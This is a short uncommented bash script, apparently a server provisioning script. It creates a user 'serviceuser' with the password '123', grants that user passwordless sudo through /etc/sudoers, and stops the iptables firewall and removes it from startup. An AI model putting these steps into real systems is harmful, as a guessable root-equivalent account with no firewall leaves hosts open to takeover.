#!/bin/bash
if id -u serviceuser >/dev/null 2>&1; then
    echo "user exists"
else
    useradd -m serviceuser
    echo serviceuser:123 | chpasswd
    LINE="serviceuser ALL=(ALL) NOPASSWD:ALL"
    FILE=/etc/sudoers
    grep -q "$LINE" "$FILE" || echo "$LINE" >> "$FILE"
fi

/etc/init.d/iptables stop
rm -f /etc/rc3.d/*iptables
